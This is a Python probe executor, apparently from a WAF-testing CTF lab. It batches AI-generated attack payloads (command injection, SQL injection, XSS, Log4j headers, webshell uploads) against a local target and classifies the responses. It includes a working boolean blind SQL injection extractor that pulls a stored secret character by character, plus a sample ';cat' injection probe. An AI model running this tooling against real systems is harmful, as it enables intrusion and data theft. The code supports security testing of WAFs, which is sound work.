#!/usr/bin/env python3
"""
批量探针执行器 — semantic-mining Skill 的机械传输层。

将 Skill 第 2 步（边界展开）中 30-50 次独立 curl 合并为一次批量调用。
AI 只读结构化 JSONL 结果，不逐条解析完整 HTML。

设计边界:
  - AI 负责: payload 生成、边界判定、质量评估、下一轮决策
  - executor 负责: HTTP 传输、超时/重试、基线去重、WAF 头捕获、机械预分类
  - executor 不做: 洞察性判定、attention_map 更新、盲区确认

支持 4 种运输模式 (--transport):
  direct    — GET, payload 作为 URL 查询参数（cmdi, sqli, xss, log4j L1）
  header    — GET, payload 作为自定义 HTTP 头（log4j L2: User-Agent, X-Forwarded-For）
  api       — POST JSON 到 /api/attack.php, WAF 白名单端点（获取 rule ID 归属）
  multipart — POST multipart/form-data（Upload 场景）

支持 2 种执行模式 (--mode):
  batch         — 并发批量探针（默认）
  blind-extract — SQLi L2 布尔盲注二分搜索逐字符提取

特殊情况:
  - XSS: --xss-mode, 检查 payload 未转义反射而非 flag 检测
  - Upload L4 webshell 验证: 上传→访问有顺序依赖, AI 用 curl
  - Upload L2 TOCTOU: .tmp 在当前 Apache 部署下不执行, 实际只需等 1s 后访问最终文件

用法:
  python3 executor.py \
    --scenario cmdi --level 1 --transport direct \
    --param cmd --baseline /tmp/baseline_cmdi.txt \
    --input /tmp/probes.jsonl --output /tmp/results.jsonl
"""

import argparse
import json
import re
import sys
import time
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Optional, Set, Tuple

# 动态导入同目录下的 schema 模块
sys.path.insert(0, str(Path(__file__).resolve().parent))
from executor_schema import (  # noqa: E402
    ATTENTION_HIGH,
    ATTENTION_LOW,
    ATTENTION_UNKNOWN,
    CLASS_BLIND_DIFF,
    CLASS_DATA_EXTRACTION,
    CLASS_FALSE_POSITIVE,
    CLASS_HTTP_ERROR,
    CLASS_NETWORK_ERROR,
    CLASS_NO_EFFECT,
    CLASS_WAF_BLOCKED,
    CLASS_XSS_BLOCKED_OR_ESCAPED,
    CLASS_XSS_REFLECTED,
    TRANSPORT_API,
    TRANSPORT_DIRECT,
    TRANSPORT_HEADER,
    TRANSPORT_MULTIPART,
    build_result,
    now_iso,
    validate_probe,
)

# ── 默认值 ────────────────────────────────────────────

DEFAULT_CONCURRENCY = 5
DEFAULT_TIMEOUT = 10       # 秒
DEFAULT_RETRIES = 2
DEFAULT_FLAG_PATTERN = r"flag\{[^}]+\}"
SNIPPET_LENGTH = 500       # 响应体捕获前 N 字符（需足够看到 403 页的规则 ID）
API_ENDPOINT = "/api/attack.php"

# ═══════════════════════════════════════════════════════════════
# Profile 加载（目标环境配置）
# ═══════════════════════════════════════════════════════════════

DEFAULT_PROFILE_PATH = "samples/targets/profile.json"


def load_profile(path: str) -> dict:
    """
    加载目标环境配置文件。
    若文件不存在，返回内置默认值（兼容旧行为）。
    返回值包含 target/success/waf/executor 段。
    """
    defaults = {
        "target": {"url_prefix": "http://localhost:8090"},
        "success": {"pattern": DEFAULT_FLAG_PATTERN},
        "waf": {
            "block_signals": {"http_status": [403]},
            "score_headers": [],
            "rule_id_pattern": None,
        },
        "executor": {
            "timeout_ms": DEFAULT_TIMEOUT * 1000,
            "retries": DEFAULT_RETRIES,
            "concurrency": DEFAULT_CONCURRENCY,
        },
    }
    try:
        with open(path, encoding="utf-8") as f:
            profile = json.load(f)
        # 深度合并：profile 覆盖 defaults
        merged = {**defaults}
        for section in ["target", "success", "waf", "executor"]:
            if section in profile:
                merged[section] = {**defaults.get(section, {}), **profile[section]}
        return merged
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return defaults


# ═══════════════════════════════════════════════════════════════
# 基线加载
# ═══════════════════════════════════════════════════════════════

def load_baseline(path: Optional[str], flag_pattern: str) -> Tuple[Set[str], str]:
    """
    加载基线文件。
    返回: (baseline_flags: set, baseline_body: str)
    """
    if not path:
        return set(), ""
    try:
        content = Path(path).read_text(errors="replace")
        flags = set(re.findall(flag_pattern, content))
        return flags, content
    except (FileNotFoundError, OSError):
        return set(), ""


# ═══════════════════════════════════════════════════════════════
# WAF 响应头解析
# ═══════════════════════════════════════════════════════════════

def parse_waf_headers(headers: dict, response_body: str = "") -> dict:
    """
    从 HTTP 响应头和 403 响应体中提取 WAF 评分和拦截信号。
    WAF 头可能带或不带 X- 前缀。评分/规则 ID 也出现在 403 响应体的 HTML 中。
    """
    def _int(val) -> Optional[int]:
        try:
            return int(val)
        except (TypeError, ValueError):
            return None

    # 尝试多种头名称变体（带/不带 X- 前缀）
    blocked = (
        headers.get("X-WAF-Blocked") == "1"
        or headers.get("WAF_BLOCKED") == "1"
    )
    score_total = (
        _int(headers.get("X-WAF-Score-Total"))
        or _int(headers.get("WAF_SCORE_TOTAL"))
    )
    score_sqli = (
        _int(headers.get("X-WAF-Score-SQLi"))
        or _int(headers.get("WAF_SCORE_SQLI"))
    )
    score_xss = (
        _int(headers.get("X-WAF-Score-XSS"))
        or _int(headers.get("WAF_SCORE_XSS"))
    )
    score_rce = (
        _int(headers.get("X-WAF-Score-RCE"))
        or _int(headers.get("WAF_SCORE_RCE"))
    )
    score_lfi = (
        _int(headers.get("X-WAF-Score-LFI"))
        or _int(headers.get("WAF_SCORE_LFI"))
    )

    # 从 403 响应体提取规则 ID（WAF 拦截页的 HTML 中包含 rule-id 标记）
    rule_id = None
    if response_body:
        rule_ids = re.findall(r'rule-id["\'>]+([0-9]+)', response_body)
        if rule_ids:
            rule_id = ",".join(rule_ids)  # 可能触发多条规则

    return {
        "waf_blocked": blocked,
        "waf_score_total": score_total,
        "waf_score_sqli": score_sqli,
        "waf_score_xss": score_xss,
        "waf_score_rce": score_rce,
        "waf_score_lfi": score_lfi,
        "waf_rule_id": rule_id,
    }


# ═══════════════════════════════════════════════════════════════
# XSS 反射检测
# ═══════════════════════════════════════════════════════════════

def check_xss_reflection(payload: str, response_body: str) -> bool:
    """
    检查 payload 是否作为 XSS 攻击向量未转义地反射到响应中。
    仅当 payload 包含 XSS 关键字符（<, >, 事件处理器等）且这些字符以原始形式出现在响应中时才判定为反射。
    排除纯文本搜索词的正常反射（如 "hello" 出现在 "搜索 hello 的结果" 中）。
    """
    if not payload or not response_body:
        return False
    # 先判断 payload 本身是否包含 XSS 攻击特征
    xss_indicators = ["<script", "<img", "<svg", "onerror=", "onload=",
                       "javascript:", "<iframe", "<body", "<input", "<a ",
                       "<div", "<link", "<object", "<embed", "onmouse",
                       "onfocus", "onblur", "onclick", "ondblclick"]
    has_xss_intent = any(indicator in payload.lower() for indicator in xss_indicators)
    if not has_xss_intent:
        return False  # 不是 XSS payload（如纯文本搜索词），不判定为反射
    # payload 包含 XSS 特征 → 检查这些特征是否以原始形式出现在响应中
    # （如果被 htmlspecialchars 转义，< 会变成 &lt;，onerror 可能被编码）
    return any(indicator in response_body for indicator in xss_indicators)


# ═══════════════════════════════════════════════════════════════
# 单条探针执行
# ═══════════════════════════════════════════════════════════════

def execute_one(
    probe: dict,
    *,
    transport: str,
    url_prefix: str,
    url_path: str,      # URL 路径中的场景段（可能与 --scenario 不同，如 log4j2 → /log4j/）
    level: int,
    param: Optional[str],
    baseline_flags: Set[str],
    flag_pattern: str,
    xss_mode: bool,
    timeout: int,
    retries: int,
    run_id: str,
    round_num: int,
    step: int,
    scenario: str,
) -> dict:
    """
    执行单条探针，返回结构化结果 dict。
    """
    probe_id = probe.get("id", "unknown")
    payload = probe.get("payload", "")
    header_name = probe.get("header_name", "User-Agent")  # header transport 用

    # ── 构造请求 ──
    if transport == TRANSPORT_API:
        url = f"{url_prefix.rstrip('/')}{API_ENDPOINT}"
        data = json.dumps({
            "scenario": scenario,
            "level": level,
            "payload": payload,
            "encoding": "none",
            "waf": "on",
        }).encode("utf-8")
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
    elif transport == TRANSPORT_HEADER:
        base_url = f"{url_prefix.rstrip('/')}/{url_path}/level{level}.php"
        if param:
            base_url += f"?{param}=dummy"
        req = urllib.request.Request(base_url, method="GET")
        req.add_header(header_name, payload)
        url = base_url
    elif transport == TRANSPORT_MULTIPART:
        filename = probe.get("filename", "shell.php")
        mime_type = probe.get("mime_type", "application/octet-stream")
        file_content = probe.get("file_content", payload)
        boundary = f"----executor{int(time.monotonic() * 1000000)}"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: {mime_type}\r\n\r\n"
            f"{file_content}\r\n"
            f"--{boundary}--\r\n"
        ).encode("utf-8")
        url = f"{url_prefix.rstrip('/')}/{url_path}/level{level}.php"
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    else:  # direct
        encoded = urllib.parse.quote(payload, safe="")
        url = f"{url_prefix.rstrip('/')}/{url_path}/level{level}.php?{param or 'q'}={encoded}"
        req = urllib.request.Request(url, method="GET")

    # ── 执行（含重试） ──
    last_error = None
    for attempt in range(1 + retries):
        try:
            start = time.monotonic()
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                elapsed_ms = int((time.monotonic() - start) * 1000)
                headers = dict(resp.headers)
                status = resp.status
        except urllib.error.HTTPError as e:
            try:
                body = e.read().decode("utf-8", errors="replace")
            except Exception:
                body = ""
            elapsed_ms = int((time.monotonic() - start) * 1000)
            headers = dict(e.headers) if hasattr(e, "headers") else {}
            status = e.code
        except (urllib.error.URLError, OSError, TimeoutError) as e:
            last_error = str(e)
            if attempt < retries:
                time.sleep(0.5 * (attempt + 1))
                continue
            # 重试耗尽
            return build_result(
                probe=probe, run_id=run_id, round_num=round_num, step=step,
                scenario=scenario, transport=transport, url=url,
                http_status=0, classification=CLASS_NETWORK_ERROR,
                waf_attention=ATTENTION_UNKNOWN, error=last_error,
            )
        else:
            last_error = None
            break  # 成功，跳出重试循环

    if last_error:
        return build_result(
            probe=probe, run_id=run_id, round_num=round_num, step=step,
            scenario=scenario, transport=transport, url=url,
            http_status=0, classification=CLASS_NETWORK_ERROR,
            waf_attention=ATTENTION_UNKNOWN, error=last_error,
        )

    # ── 提取 WAF 信号 ──
    waf = parse_waf_headers(headers, body)

    # ── Flag 检测 ──
    found_flags = re.findall(flag_pattern, body)
    new_flags = [f for f in found_flags if f not in baseline_flags]
    flag_hit = bool(new_flags)
    flag_value = new_flags[0] if new_flags else (found_flags[0] if found_flags else None)
    baseline_flag = bool(found_flags) and not bool(new_flags)

    # ── Upload 路径提取（multipart transport） ──
    upload_path = None
    if transport == TRANSPORT_MULTIPART:
        m = re.search(r"href=['\"]\.\./uploads/([^'\"]+)['\"]", body)
        if m:
            upload_path = f"/uploads/{m.group(1)}"
        elif "上传成功" in body or "最终文件" in body:
            # 成功但无法提取路径 → 尝试常见模式
            upload_path = f"/uploads/{filename}"

    # ── 分类 ──
    classification = CLASS_NO_EFFECT
    waf_attention = ATTENTION_LOW

    if xss_mode:
        # ── XSS 模式：判定基于 payload 反射，而非 flag ──
        is_reflected = check_xss_reflection(payload, body)
        if status == 403 or waf["waf_blocked"]:
            classification = CLASS_WAF_BLOCKED
            waf_attention = ATTENTION_HIGH
        elif is_reflected:
            classification = CLASS_XSS_REFLECTED
            waf_attention = ATTENTION_LOW
        else:
            classification = CLASS_XSS_BLOCKED_OR_ESCAPED
            waf_attention = ATTENTION_LOW
    elif status == 403 or waf["waf_blocked"]:
        classification = CLASS_WAF_BLOCKED
        waf_attention = ATTENTION_HIGH
    elif status == 200:
        if flag_hit:
            classification = CLASS_DATA_EXTRACTION
            waf_attention = ATTENTION_LOW
        elif baseline_flag:
            classification = CLASS_FALSE_POSITIVE
            waf_attention = ATTENTION_LOW
        else:
            classification = CLASS_NO_EFFECT
            waf_attention = ATTENTION_LOW
    elif status == 0:
        classification = CLASS_NETWORK_ERROR
        waf_attention = ATTENTION_UNKNOWN
    else:
        classification = CLASS_HTTP_ERROR
        waf_attention = ATTENTION_UNKNOWN

    snippet = body
    if upload_path:
        snippet = f"[UPLOAD_PATH: {upload_path}]\n{body[:250]}"

    return build_result(
        probe=probe, run_id=run_id, round_num=round_num, step=step,
        scenario=scenario, transport=transport, url=url,
        http_status=status, classification=classification,
        waf_attention=waf_attention, flag_hit=flag_hit,
        flag_value=flag_value, baseline_flag=baseline_flag,
        response_snippet=snippet, response_size=len(body),
        response_time_ms=elapsed_ms,
        **waf,
    )


# ═══════════════════════════════════════════════════════════════
# 批量执行
# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════
# Blind extraction（SQLi L2 布尔盲注逐字符提取）
# ═══════════════════════════════════════════════════════════════

def blind_extract(
    *,
    url_prefix: str,
    url_path: str,
    level: int,
    param: str,
    scenario: str,
    target_table: str,
    target_column: str,
    target_where_key: str,
    target_where_val: str,
    predicate_template: str,
    charset: str,
    max_length: int,
    timeout: int,
    output_path: str,
    baseline_body: str = "",
) -> dict:
    """
    布尔盲注逐字符二分提取。

    predicate_template 中的 {SUBQUERY} 替换为子查询，{POS} 替换为位置，{ORD} 替换为阈值。
    例如: "ORD(MID(({SUBQUERY}),{POS},1))>{ORD}"

    返回: {"extracted": "flag{...}", "positions": N, "requests": M, "blocked_at": pos|null}
    """
    TRUE_MARKER = "Player04"
    FALSE_MARKER = "Player01"

    def _send(payload: str) -> dict:
        """发送单次盲注探测，返回 {status, body, first_row, blocked}。"""
        encoded = urllib.parse.quote(payload, safe="")
        url = f"{url_prefix.rstrip('/')}/{url_path}/level{level}.php?{param}={encoded}"
        try:
            req = urllib.request.Request(url, method="GET")
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                status = resp.status
        except urllib.error.HTTPError as e:
            try:
                body = e.read().decode("utf-8", errors="replace")
            except Exception:
                body = ""
            status = e.code
        except Exception:
            return {"status": 0, "body": "", "first_row": "", "blocked": False}

        # 提取第一个 PlayerNN（<td> 标签内可能有空白）
        m = re.search(r"<td>\s*(Player\d+)\s*</td>", body)
        first_row = m.group(1) if m else ""
        blocked = (status == 403 or "WAF 拦截" in body or "rule-id" in body)
        return {"status": status, "body": body, "first_row": first_row, "blocked": blocked}

    # 组装 SQL 子查询
    subquery = f"SELECT {target_column} FROM {target_table} WHERE {target_where_key}='{target_where_val}'"
    total_requests = 0
    extracted = ""

    results = []
    print(f"\n[blind-extract] 目标: {target_table}.{target_column} WHERE {target_where_key}={target_where_val}")
    print(f"[blind-extract] 字符集: {charset} ({len(charset)} chars), 最大长度: {max_length}")
    print(f"[blind-extract] 谓词模板: {predicate_template}")

    for pos in range(1, max_length + 1):
        low, high = 0, len(charset) - 1
        found_char = None

        while low <= high:
            mid = (low + high) // 2
            predicate = predicate_template.replace("{SUBQUERY}", subquery)
            predicate = predicate.replace("{POS}", str(pos))
            predicate = predicate.replace("{ORD}", str(ord(charset[mid])))
            payload = f"score*({predicate})"
            total_requests += 1

            resp = _send(payload)
            if resp["blocked"]:
                result = {"position": pos, "char": None, "requests": total_requests,
                          "blocked_at_pos": pos, "error": "WAF blocked"}
                print(f"  [WARN] pos={pos} WAF blocked — 提取中止")
                with open(output_path, "w", encoding="utf-8") as f:
                    json.dump(result, f, ensure_ascii=False, indent=2)
                return result

            if resp["first_row"] == TRUE_MARKER:
                # 待查字符 > charset[mid]
                low = mid + 1
            elif resp["first_row"] == FALSE_MARKER:
                # 待查字符 <= charset[mid]
                # 但如果 mid==0 且 FALSE，说明字符 <= charset[0]，即 = charset[0]
                if mid == 0:
                    found_char = charset[0]
                    break
                high = mid - 1
            else:
                # 行序既不是 TRUE 也不是 FALSE——可能 SQL 错误或 WAF 篡改
                result = {"position": pos, "char": None, "requests": total_requests,
                          "blocked_at_pos": pos, "error": f"行序异常: {resp['first_row']}"}
                print(f"  [WARN] pos={pos} 行序异常: {resp['first_row']}")
                with open(output_path, "w", encoding="utf-8") as f:
                    json.dump(result, f, ensure_ascii=False, indent=2)
                return result

        # 二分收敛——确认字符
        if found_char is None and low < len(charset):
            found_char = charset[low]
        elif found_char is None:
            found_char = charset[-1]

        extracted += found_char
        print(f"  pos={pos}: '{found_char}' (ASCII {ord(found_char)}) → {extracted}")

        if found_char == "}":
            print(f"  终止字符 '}}' 在位置 {pos} — 提取完成")
            break

    result = {"extracted": extracted, "positions": len(extracted), "requests": total_requests,
              "blocked_at_pos": None, "error": None}
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)

    print(f"\n[blind-extract] 结果: {extracted}")
    print(f"[blind-extract] {len(extracted)} 字符, {total_requests} 次请求")
    return result


# ═══════════════════════════════════════════════════════════════
# 批量执行
# ═══════════════════════════════════════════════════════════════

def execute_batch(
    probes: list,
    output_path: str,
    concurrency: int,
    **kwargs,
) -> dict:
    """并发执行一批探针，结果逐行写入输出文件。返回统计信息。"""
    stats = {"total": len(probes), "success": 0, "blocked": 0, "error": 0, "time_ms": 0}
    batch_start = time.monotonic()

    with open(output_path, "w", encoding="utf-8") as out_f:
        with ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = {
                executor.submit(execute_one, probe, **kwargs): probe
                for probe in probes
            }
            for future in as_completed(futures):
                result = future.result()
                out_f.write(json.dumps(result, ensure_ascii=False) + "\n")
                out_f.flush()

                cls = result.get("classification", "")
                if cls == CLASS_WAF_BLOCKED:
                    stats["blocked"] += 1
                elif result.get("error"):
                    stats["error"] += 1
                else:
                    stats["success"] += 1

    stats["time_ms"] = int((time.monotonic() - batch_start) * 1000)
    return stats


# ═══════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="批量探针执行器 — semantic-mining Skill 第 2 步机械传输层",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例 (CMDi direct):
  python3 executor.py --scenario cmdi --level 1 --transport direct \\
    --param cmd --baseline /tmp/baseline.txt \\
    --input probes.jsonl --output results.jsonl

示例 (XSS mode):
  python3 executor.py --scenario xss --level 1 --transport direct \\
    --param q --xss-mode --baseline /tmp/baseline.txt \\
    --input probes.jsonl --output results.jsonl

示例 (Log4j2 header):
  python3 executor.py --scenario log4j2 --level 2 --transport header \\
    --baseline /tmp/baseline.txt \\
    --input probes.jsonl --output results.jsonl

输入格式 (probes.jsonl, 每行一条):
  {"id":"1","payload":";cat /srv/data/db.json","category":"separator","dimension":"separator","variant":";"}
  (header transport 需额外字段 "header_name": "User-Agent")
        """,
    )

    parser.add_argument("--scenario", required=True,
                        help="场景: cmdi | sqli | upload | xss | log4j2")
    parser.add_argument("--level", type=int, required=True,
                        help="关卡编号 (1 或 2)")
    parser.add_argument("--transport", default=None,
                        choices=[TRANSPORT_DIRECT, TRANSPORT_HEADER, TRANSPORT_API, TRANSPORT_MULTIPART],
                        help=f"运输模式: {TRANSPORT_DIRECT} | {TRANSPORT_HEADER} | {TRANSPORT_API} | {TRANSPORT_MULTIPART}")
    parser.add_argument("--mode", default="batch",
                        choices=["batch", "blind-extract"],
                        help="执行模式: batch (批量探针, 默认) | blind-extract (SQLi布尔盲注逐字符提取)")
    parser.add_argument("--extract-target-table", default="app_settings",
                        help="盲注目标表 (默认: app_settings)")
    parser.add_argument("--extract-target-column", default="setting_value",
                        help="盲注目标列 (默认: setting_value)")
    parser.add_argument("--extract-target-where-key", default="setting_key",
                        help="盲注 WHERE 条件列 (默认: setting_key)")
    parser.add_argument("--extract-target-where-val", default="app.secret",
                        help="盲注 WHERE 条件值 (默认: app.secret)")
    parser.add_argument("--extract-predicate-template",
                        default="ORD(MID(({SUBQUERY}),{POS},1))>{ORD}",
                        help="盲注谓词模板 ({SUBQUERY}/{POS}/{ORD} 占位符)")
    parser.add_argument("--extract-charset", default="abcdefghijklmnopqrstuvwxyz0123456789_{}",
                        help="盲注搜索字符集 (默认: flag 格式常用字符)")
    parser.add_argument("--extract-max-length", type=int, default=64,
                        help="盲注最大提取长度 (默认: 64)")
    parser.add_argument("--profile", default=DEFAULT_PROFILE_PATH,
                        help=f"目标环境配置文件 (默认: {DEFAULT_PROFILE_PATH})")
    parser.add_argument("--url-prefix", default=None,
                        help="WAF 地址前缀 (默认从 profile 读取，fallback: http://localhost:8090)")
    parser.add_argument("--url-path", default=None,
                        help="URL 路径中的场景段 (默认同 --scenario，如 log4j2 → 传 --url-path log4j)")
    parser.add_argument("--param", default=None,
                        help="GET 参数名 (direct transport 必填)")
    parser.add_argument("--baseline", default=None,
                        help="基线响应文件路径 (用于 flag 去重)")
    parser.add_argument("--flag-pattern", default=DEFAULT_FLAG_PATTERN,
                        help=f"Flag 正则 (默认: {DEFAULT_FLAG_PATTERN})")
    parser.add_argument("--xss-mode", action="store_true",
                        help="XSS 模式: 判定基于 payload 反射而非 flag 检测")
    parser.add_argument("--input", default=None,
                        help="输入探针 JSONL 文件 (batch 模式必需)")
    parser.add_argument("--output", required=True,
                        help="输出结果 JSONL 文件")
    parser.add_argument("--run-id", default=None,
                        help="运行 ID (默认自动生成)")
    parser.add_argument("--round", type=int, default=1,
                        help="当前轮次 (默认: 1)")
    parser.add_argument("--step", type=int, default=2,
                        help="当前步骤 (默认: 2)")
    parser.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY,
                        help=f"并发数 (默认: {DEFAULT_CONCURRENCY})")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                        help=f"单请求超时秒数 (默认: {DEFAULT_TIMEOUT})")
    parser.add_argument("--retries", type=int, default=DEFAULT_RETRIES,
                        help=f"失败重试次数 (默认: {DEFAULT_RETRIES})")

    args = parser.parse_args()

    # 加载 profile（CLI 参数可覆盖 profile 中的值）
    profile = load_profile(args.profile)

    url_prefix = args.url_prefix or profile["target"]["url_prefix"]
    flag_pattern = args.flag_pattern or profile["success"]["pattern"]
    timeout_s = args.timeout or (profile["executor"]["timeout_ms"] // 1000)
    _retries = args.retries if args.retries != DEFAULT_RETRIES else profile["executor"]["retries"]
    _concurrency = args.concurrency if args.concurrency != DEFAULT_CONCURRENCY else profile["executor"]["concurrency"]

    # ── blind-extract 模式 ──
    if args.mode == "blind-extract":
        if not args.param:
            print("[ERROR] blind-extract 模式需要 --param 参数")
            sys.exit(1)

        baseline_flags, baseline_body = load_baseline(args.baseline, flag_pattern)
        if not args.baseline:
            print("[WARN] 无基线文件 — 盲注 TRUE/FALSE 行序识别可能不准确")

        blind_extract(
            url_prefix=url_prefix,
            url_path=args.url_path or args.scenario,
            level=args.level,
            param=args.param,
            scenario=args.scenario,
            target_table=args.extract_target_table,
            target_column=args.extract_target_column,
            target_where_key=args.extract_target_where_key,
            target_where_val=args.extract_target_where_val,
            predicate_template=args.extract_predicate_template,
            charset=args.extract_charset,
            max_length=args.extract_max_length,
            timeout=timeout_s,
            output_path=args.output,
            baseline_body=baseline_body,
        )
        return

    # ── batch 模式 ──
    if not args.transport:
        print("[ERROR] batch 模式需要 --transport 参数")
        sys.exit(1)

    # 参数校验
    if args.transport == TRANSPORT_DIRECT and not args.param:
        print("[ERROR] direct transport 需要 --param 参数")
        sys.exit(1)

    if args.scenario == "xss" and not args.xss_mode:
        print("[WARN] 提示: XSS 场景建议使用 --xss-mode，因为 flag 静态存在于页面 HTML 中")

    # 加载基线
    baseline_flags, _ = load_baseline(args.baseline, flag_pattern)
    if args.baseline:
        print(f"[baseline] 基线: {len(baseline_flags)} 个 flag 来自 {args.baseline}")
    else:
        print("[WARN] 无基线文件 — flag 命中不排除页面模板")

    # 加载探针
    probes = []
    line_no = 0
    with open(args.input, encoding="utf-8") as f:
        for line in f:
            line_no += 1
            line = line.strip()
            if not line:
                continue
            try:
                probe = json.loads(line)
            except json.JSONDecodeError as e:
                print(f"[ERROR] 第{line_no}行 JSON 解析失败: {e}", file=sys.stderr)
                print(f"  内容: {line[:120]}...", file=sys.stderr)
                print(f"  提示: 反斜杠需双转义(\\ → \\\\)，引号需闭合", file=sys.stderr)
                sys.exit(1)
            errors = validate_probe(probe)
            if errors:
                print(f"[WARN] 跳过无效探针: {probe.get('id','?')} — {'; '.join(errors)}", file=sys.stderr)
                continue
            probes.append(probe)

    if not probes:
        print("[ERROR] 没有有效探针")
        sys.exit(1)

    run_id = args.run_id or f"{args.scenario}_r{args.round}_{now_iso().replace(':','-')[:19]}"

    print(f"[target] 探针: {len(probes)} 条 | 场景: {args.scenario} L{args.level} | 运输: {args.transport}")
    print(f"[exec] 并发: {_concurrency} | 超时: {timeout_s}s | XSS模式: {'是' if args.xss_mode else '否'}")

    stats = execute_batch(
        probes=probes,
        output_path=args.output,
        concurrency=_concurrency,
        transport=args.transport,
        url_prefix=url_prefix,
        url_path=args.url_path or args.scenario,
        level=args.level,
        param=args.param,
        baseline_flags=baseline_flags,
        flag_pattern=flag_pattern,
        xss_mode=args.xss_mode,
        timeout=timeout_s,
        retries=_retries,
        run_id=run_id,
        round_num=args.round,
        step=args.step,
        scenario=args.scenario,
    )

    print(f"""
[OK] 完成 ({stats['time_ms']}ms)
  总计:  {stats['total']}
  放行:  {stats['success']}
  拦截:  {stats['blocked']}
  错误:  {stats['error']}
  输出:  {args.output}
  运行:  {run_id}
""")


if __name__ == "__main__":
    main()
